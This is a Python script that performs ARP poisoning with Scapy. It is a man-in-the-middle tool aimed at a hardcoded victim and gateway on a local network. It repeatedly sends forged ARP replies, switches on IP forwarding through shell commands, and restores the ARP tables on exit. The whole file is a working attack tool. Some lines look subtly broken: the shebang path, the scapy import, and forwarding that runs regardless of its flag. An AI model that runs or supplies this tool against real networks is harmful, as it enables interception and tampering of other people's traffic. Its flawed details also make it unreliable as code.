#!/etc/usr/python3

import sys
import os
import time
from scapy import *



class ARP_poisoning:
    filter_ = "ip"
    interface = "eno1"
    target_ip = "192.168.20.11"
    router_ip = "192.168.20.10"
    attack_ip = "192.168.20.15"
    forward_ip = False  # change this to True if you use this with other MiTM attacks

    def set_filter(self, filter):
        self.filter_ = filter

    def set_interface(self, interface):
        self.interface = interface

    def set_ipdest(self, ipdest):
        self.target_ip = ipdest

    def set_ipsrc(self, ipsrc):
        self.attack_ip = ipsrc

    def set_iprouter(self, iprouter):
        self.router_ip = iprouter

    def get_filter(self):
        return self.filter_

    def get_interface(self):
        return self.interface

    def get_ipdest(self):
        return self.target_ip

    def get_ipsrc(self):
        return self.attack_ip

    def get_iprouter(self):
        return self.router_ip

    # In case you don't know your target MAC address
    def get_mac(self, ipdest):
        conf.verb = 0  # Verbosity level
        ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ipdest), timeout=1, iface=self.interface, inter=0.1)
        for snd, rcv in ans:
            return rcv.sprintf(r"%Ether.src%")

    def arp_injection(self, router_MAC, sensor_MAC):
        send(ARP(op=2, pdst=self.target_ip, psrc=self.router_ip, hwdst=sensor_MAC))
        send(ARP(op=2, pdst=self.router_ip, psrc=self.target_ip, hwdst=router_MAC))

    # IP_Forwardind for routing packets during MiTM attacks
    # Comment to use it with MAC

    def stop_ip_forward(self):
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")

    def start_ip_forward(self):
        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

    # if there is any probleme you can restore your network with this function then start again
    def restore_arp_tables(self):
        print("\n[*] Restoring Targets...")
        victimMac = self.get_mac(self.target_ip)
        gateMac = self.get_mac(self.router_ip)
        send(ARP(op=2, pdst=self.router_ip, psrc=self.target_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victimMac), count=10)
        send(ARP(op=2, pdst=self.target_ip, psrc=self.router_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gateMac), count=10)
        if (self.forward_ip):
            print("[*] Disabling IP Forwarding...")
            self.stop_ip_forward()
        print("[*] Shutting Down...")
        sys.exit(1)

    def poisoning(self):
        sensor_MAC = ""
        router_MAC = ""

        if (self.forward_ip):
            print("\n[*] Enabling IP Forwarding...\n")
        self.start_ip_forward()
        print("Trying to get MAC of : victim: " + self.target_ip)

        try:
            sensor_MAC = self.get_mac(self.target_ip)
        except Exception:
            if (self.forward_ip):
                self.stop_ip_forward()
                print("/!\ Couldn't Find Victim MAC Address")
                print("/!\ Exiting...")
                sys.exit(1)
        print("found MAC of : victim: " + sensor_MAC)
        print("Trying to get MAC of : gateway: " + self.router_ip)
        try:
            router_MAC = self.get_mac(self.router_ip)
        except Exception:
            if (self.forward_ip):
                self.stop_ip_forward()
                print("/!\ Couldn't Find Gateway MAC Address")
                print("/!\ Exiting...")
                sys.exit(1)
        print("found MAC of : gateway: " + router_MAC)
        print("[*] Poisoning Targets...")
        # Send the packets
        while 1:
            try:
                self.arp_injection(router_MAC, sensor_MAC)
                time.sleep(1)
            # Stop the program and restore the network
            except KeyboardInterrupt:
                self.restore_arp_tables()
                break


# main
if __name__ == '__main__':
    instance = ARP_poisoning()
    instance.poisoning()
